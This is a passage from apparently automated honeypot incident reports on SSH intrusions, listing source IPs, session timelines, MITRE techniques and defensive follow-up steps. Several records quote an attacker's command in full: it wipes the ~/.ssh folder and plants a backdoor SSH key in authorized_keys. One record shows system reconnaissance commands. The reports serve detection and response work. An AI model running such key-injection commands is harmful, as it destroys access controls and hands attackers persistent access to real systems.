| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:47:35` | `cowrie.session.connect` |
| `2026-07-20 21:47:35` | `cowrie.client.version` |
| `2026-07-20 21:47:35` | `cowrie.client.kex` |
| `2026-07-20 21:47:36` | `cowrie.login.success` |
| `2026-07-20 21:47:37` | `cowrie.session.params` |
| `2026-07-20 21:47:37` | `cowrie.command.input` |
| `2026-07-20 21:47:37` | `cowrie.command.failed` |
| `2026-07-20 21:47:38` | `cowrie.log.closed` |
| `2026-07-20 21:47:39` | `cowrie.session.params` |
| `2026-07-20 21:47:39` | `cowrie.command.input` |
| `2026-07-20 21:47:39` | `cowrie.session.file_download` |
| `2026-07-20 21:47:39` | `cowrie.log.closed` |
| `2026-07-20 21:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.248[.]241` to AbuseIPDB if not already reported
- [ ] Block `43.157.248[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9acb353c5d7d

| Field | Detail |
|---|---|
| **Source IP** | `43.157.248[.]241` |
| **First Seen** | 2026-07-20 21:47 |
| **Last Seen** | 2026-07-20 21:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:47:39` | `cowrie.session.connect` |
| `2026-07-20 21:47:39` | `cowrie.client.version` |
| `2026-07-20 21:47:39` | `cowrie.client.kex` |
| `2026-07-20 21:47:40` | `cowrie.login.success` |
| `2026-07-20 21:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.248[.]241` to AbuseIPDB if not already reported
- [ ] Block `43.157.248[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c37a23630347

| Field | Detail |
|---|---|
| **Source IP** | `43.157.248[.]241` |
| **First Seen** | 2026-07-20 21:47 |
| **Last Seen** | 2026-07-20 21:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:47:41` | `cowrie.session.connect` |
| `2026-07-20 21:47:41` | `cowrie.client.version` |
| `2026-07-20 21:47:41` | `cowrie.client.kex` |
| `2026-07-20 21:47:42` | `cowrie.login.success` |
| `2026-07-20 21:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.248[.]241` to AbuseIPDB if not already reported
- [ ] Block `43.157.248[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b388b3199a2b

| Field | Detail |
|---|---|
| **Source IP** | `179.185.227[.]77` |
| **First Seen** | 2026-07-20 21:49 |
| **Last Seen** | 2026-07-20 21:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:49:16` | `cowrie.session.connect` |
| `2026-07-20 21:49:17` | `cowrie.client.version` |
| `2026-07-20 21:49:17` | `cowrie.client.kex` |
| `2026-07-20 21:49:19` | `cowrie.login.success` |
| `2026-07-20 21:49:19` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.227[.]77` to AbuseIPDB if not already reported
- [ ] Block `179.185.227[.]77` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc0dffa87a3

| Field | Detail |
|---|---|
| **Source IP** | `191.205.210[.]9` |
| **First Seen** | 2026-07-20 21:49 |
| **Last Seen** | 2026-07-20 21:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:49:37` | `cowrie.session.connect` |
| `2026-07-20 21:49:37` | `cowrie.client.version` |
| `2026-07-20 21:49:38` | `cowrie.client.kex` |
| `2026-07-20 21:49:38` | `cowrie.login.success` |
| `2026-07-20 21:49:39` | `cowrie.session.params` |
| `2026-07-20 21:49:39` | `cowrie.command.input` |
| `2026-07-20 21:49:39` | `cowrie.command.failed` |
| `2026-07-20 21:49:39` | `cowrie.log.closed` |
| `2026-07-20 21:49:40` | `cowrie.session.params` |
| `2026-07-20 21:49:40` | `cowrie.command.input` |
| `2026-07-20 21:49:40` | `cowrie.session.file_download` |
| `2026-07-20 21:49:40` | `cowrie.log.closed` |
| `2026-07-20 21:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.205.210[.]9` to AbuseIPDB if not already reported
- [ ] Block `191.205.210[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1f78ea230eb

| Field | Detail |
|---|---|
| **Source IP** | `191.205.210[.]9` |
| **First Seen** | 2026-07-20 21:49 |
| **Last Seen** | 2026-07-20 21:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:49:40` | `cowrie.session.connect` |
| `2026-07-20 21:49:40` | `cowrie.client.version` |
| `2026-07-20 21:49:40` | `cowrie.client.kex` |
| `2026-07-20 21:49:41` | `cowrie.login.success` |
| `2026-07-20 21:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.205.210[.]9` to AbuseIPDB if not already reported
- [ ] Block `191.205.210[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e61a2f6f1602

| Field | Detail |
|---|---|
| **Source IP** | `191.205.210[.]9` |
| **First Seen** | 2026-07-20 21:49 |
| **Last Seen** | 2026-07-20 21:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:49:41` | `cowrie.session.connect` |
| `2026-07-20 21:49:41` | `cowrie.client.version` |
| `2026-07-20 21:49:41` | `cowrie.client.kex` |
| `2026-07-20 21:49:42` | `cowrie.login.success` |
| `2026-07-20 21:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.205.210[.]9` to AbuseIPDB if not already reported
- [ ] Block `191.205.210[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5fa74ba493d

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-20 21:50 |
| **Last Seen** | 2026-07-20 21:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:50:27` | `cowrie.session.connect` |
| `2026-07-20 21:50:27` | `cowrie.client.version` |
| `2026-07-20 21:50:27` | `cowrie.client.kex` |
| `2026-07-20 21:50:29` | `cowrie.login.success` |
| `2026-07-20 21:50:29` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce184d1e1b7c

| Field | Detail |
|---|---|
| **Source IP** | `122.187.227[.]145` |
| **First Seen** | 2026-07-20 21:50 |
| **Last Seen** | 2026-07-20 21:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:50:39` | `cowrie.session.connect` |
| `2026-07-20 21:50:39` | `cowrie.client.version` |
| `2026-07-20 21:50:39` | `cowrie.client.kex` |
| `2026-07-20 21:50:41` | `cowrie.login.success` |
| `2026-07-20 21:50:42` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.227[.]145` to AbuseIPDB if not already reported
- [ ] Block `122.187.227[.]145` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f3a2ff0263b

| Field | Detail |
|---|---|
| **Source IP** | `61.2.228[.]177` |
| **First Seen** | 2026-07-20 21:52 |
| **Last Seen** | 2026-07-20 21:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:52:17` | `cowrie.session.connect` |
| `2026-07-20 21:52:18` | `cowrie.client.version` |
| `2026-07-20 21:52:18` | `cowrie.client.kex` |
| `2026-07-20 21:52:20` | `cowrie.login.success` |
| `2026-07-20 21:52:21` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.228[.]177` to AbuseIPDB if not already reported
- [ ] Block `61.2.228[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfec9cdb219b

| Field | Detail |
|---|---|
| **Source IP** | `150.228.187[.]139` |
| **First Seen** | 2026-07-20 21:52 |
| **Last Seen** | 2026-07-20 21:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:52:26` | `cowrie.session.connect` |
| `2026-07-20 21:52:27` | `cowrie.client.version` |
| `2026-07-20 21:52:27` | `cowrie.client.kex` |
| `2026-07-20 21:52:29` | `cowrie.login.success` |
| `2026-07-20 21:52:30` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.228.187[.]139` to AbuseIPDB if not already reported
- [ ] Block `150.228.187[.]139` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06ab4d6333ce

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-07-20 21:52 |
| **Last Seen** | 2026-07-20 21:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:52:48` | `cowrie.session.connect` |
| `2026-07-20 21:52:49` | `cowrie.client.version` |
| `2026-07-20 21:52:49` | `cowrie.client.kex` |
| `2026-07-20 21:52:51` | `cowrie.login.success` |
| `2026-07-20 21:52:52` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d9aafbd4c5

| Field | Detail |
|---|---|
| **Source IP** | `118.194.228[.]101` |
| **First Seen** | 2026-07-20 21:55 |
| **Last Seen** | 2026-07-20 21:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:55:30` | `cowrie.session.connect` |
| `2026-07-20 21:55:30` | `cowrie.client.version` |
| `2026-07-20 21:55:30` | `cowrie.client.kex` |
| `2026-07-20 21:55:31` | `cowrie.login.success` |
| `2026-07-20 21:55:32` | `cowrie.session.params` |
| `2026-07-20 21:55:32` | `cowrie.command.input` |
| `2026-07-20 21:55:32` | `cowrie.command.failed` |
| `2026-07-20 21:55:32` | `cowrie.log.closed` |
| `2026-07-20 21:55:33` | `cowrie.session.params` |
| `2026-07-20 21:55:33` | `cowrie.command.input` |
| `2026-07-20 21:55:33` | `cowrie.session.file_download` |
| `2026-07-20 21:55:33` | `cowrie.log.closed` |
| `2026-07-20 21:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.228[.]101` to AbuseIPDB if not already reported
- [ ] Block `118.194.228[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcc43b78bc1b

| Field | Detail |
|---|---|
| **Source IP** | `118.194.228[.]101` |
| **First Seen** | 2026-07-20 21:55 |
| **Last Seen** | 2026-07-20 21:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:55:33` | `cowrie.session.connect` |
| `2026-07-20 21:55:33` | `cowrie.client.version` |
| `2026-07-20 21:55:33` | `cowrie.client.kex` |
| `2026-07-20 21:55:34` | `cowrie.login.success` |
| `2026-07-20 21:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.228[.]101` to AbuseIPDB if not already reported
- [ ] Block `118.194.228[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6124e12f1ac

| Field | Detail |
|---|---|
| **Source IP** | `118.194.228[.]101` |
| **First Seen** | 2026-07-20 21:55 |
| **Last Seen** | 2026-07-20 21:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:55:34` | `cowrie.session.connect` |
| `2026-07-20 21:55:34` | `cowrie.client.version` |
| `2026-07-20 21:55:35` | `cowrie.client.kex` |
| `2026-07-20 21:55:35` | `cowrie.login.success` |
| `2026-07-20 21:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.228[.]101` to AbuseIPDB if not already reported
- [ ] Block `118.194.228[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d18bfc49b3f5

| Field | Detail |
|---|---|
| **Source IP** | `122.170.99[.]195` |
| **First Seen** | 2026-07-20 21:55 |
| **Last Seen** | 2026-07-20 21:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:55:37` | `cowrie.session.connect` |
| `2026-07-20 21:55:38` | `cowrie.client.version` |
| `2026-07-20 21:55:38` | `cowrie.client.kex` |
| `2026-07-20 21:55:39` | `cowrie.login.success` |
| `2026-07-20 21:55:39` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.99[.]195` to AbuseIPDB if not already reported
- [ ] Block `122.170.99[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50738f24573

| Field | Detail |
|---|---|
| **Source IP** | `47.77.239[.]231` |
| **First Seen** | 2026-07-20 22:00 |
| **Last Seen** | 2026-07-20 22:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, echo TIMING_CHECK, cat /proc/cpuinfo, cat /proc/mtd, cat /proc/net/arp` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:00:48` | `cowrie.session.connect` |
| `2026-07-20 22:00:48` | `cowrie.login.success` |
| `2026-07-20 22:00:49` | `cowrie.session.params` |
| `2026-07-20 22:00:49` | `cowrie.command.input` |
| `2026-07-20 22:00:50` | `cowrie.command.input` |
| `2026-07-20 22:00:50` | `cowrie.command.input` |
| `2026-07-20 22:00:51` | `cowrie.command.input` |
| `2026-07-20 22:00:51` | `cowrie.command.input` |
| `2026-07-20 22:00:52` | `cowrie.command.input` |
| `2026-07-20 22:00:52` | `cowrie.command.input` |
| `2026-07-20 22:00:55` | `cowrie.log.closed` |
| `2026-07-20 22:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.239[.]231` to AbuseIPDB if not already reported
- [ ] Block `47.77.239[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e935ba96edc3

| Field | Detail |
|---|---|
| **Source IP** | `182.151.45[.]136` |
| **First Seen** | 2026-07-20 22:03 |
| **Last Seen** | 2026-07-20 22:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:03:11` | `cowrie.session.connect` |
| `2026-07-20 22:03:12` | `cowrie.client.version` |
| `2026-07-20 22:03:12` | `cowrie.client.kex` |
| `2026-07-20 22:03:14` | `cowrie.login.success` |
| `2026-07-20 22:03:15` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.151.45[.]136` to AbuseIPDB if not already reported
- [ ] Block `182.151.45[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-397dc297cf4e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-07-20 22:03 |
| **Last Seen** | 2026-07-20 22:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:03:20` | `cowrie.session.connect` |
| `2026-07-20 22:03:20` | `cowrie.client.version` |
| `2026-07-20 22:03:20` | `cowrie.client.kex` |
| `2026-07-20 22:03:21` | `cowrie.login.success` |
| `2026-07-20 22:03:21` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7614de8fb59

| Field | Detail |
|---|---|
| **Source IP** | `112.6.127[.]244` |
| **First Seen** | 2026-07-20 22:10 |
| **Last Seen** | 2026-07-20 22:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:10:39` | `cowrie.session.connect` |
| `2026-07-20 22:10:40` | `cowrie.client.version` |
| `2026-07-20 22:10:40` | `cowrie.client.kex` |
| `2026-07-20 22:10:43` | `cowrie.login.success` |
| `2026-07-20 22:10:44` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.127[.]244` to AbuseIPDB if not already reported
- [ ] Block `112.6.127[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48671965a3f3

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-20 22:10 |
| **Last Seen** | 2026-07-20 22:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:10:49` | `cowrie.session.connect` |
| `2026-07-20 22:10:50` | `cowrie.client.version` |
| `2026-07-20 22:10:50` | `cowrie.client.kex` |
| `2026-07-20 22:10:50` | `cowrie.login.success` |
| `2026-07-20 22:10:51` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb36f85ad205

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]157` |
| **First Seen** | 2026-07-20 22:13 |
| **Last Seen** | 2026-07-20 22:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:13:51` | `cowrie.session.connect` |
| `2026-07-20 22:13:52` | `cowrie.client.version` |
| `2026-07-20 22:13:52` | `cowrie.client.kex` |
| `2026-07-20 22:13:54` | `cowrie.login.success` |
| `2026-07-20 22:13:55` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]157` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95955f3f73a0

| Field | Detail |
|---|---|
| **Source IP** | `81.237.155[.]113` |
| **First Seen** | 2026-07-20 22:13 |
| **Last Seen** | 2026-07-20 22:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:13:53` | `cowrie.session.connect` |
| `2026-07-20 22:13:54` | `cowrie.client.version` |
| `2026-07-20 22:13:54` | `cowrie.client.kex` |
| `2026-07-20 22:13:55` | `cowrie.login.success` |
| `2026-07-20 22:13:55` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.237.155[.]113` to AbuseIPDB if not already reported
- [ ] Block `81.237.155[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d0573527cb

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-07-20 22:14 |
| **Last Seen** | 2026-07-20 22:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
